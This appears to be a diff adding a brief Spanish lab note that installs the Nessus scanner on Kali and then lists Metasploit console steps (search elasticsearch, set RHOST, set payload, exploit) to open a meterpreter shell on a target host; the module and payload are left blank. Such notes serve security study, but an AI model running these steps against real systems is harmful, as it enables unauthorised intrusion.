@@ -1,0 +1,16 @@
+Para instalar los paquetes de Nessus desde la carpeta de descargas:
+
+sudo su
+chmod +x Nessus-8.13.1-debian6_amd64.deb
+dpkg -i Nessus-8.13.1-debian6_amd64.deb
+/bin/systemctl start nessusd.service
+Luego navegas al sitio https://kali:8834/ e ingresas tu código y esperas a que finalice la instalación, a continuación en la terminal de comandos:
+
+msfconsole
+search elasticsearch
+use …
+show option
+set RHOST 192.167.2.7
+set payload
+exploit
+Esto abrirá la consola de meterpreter
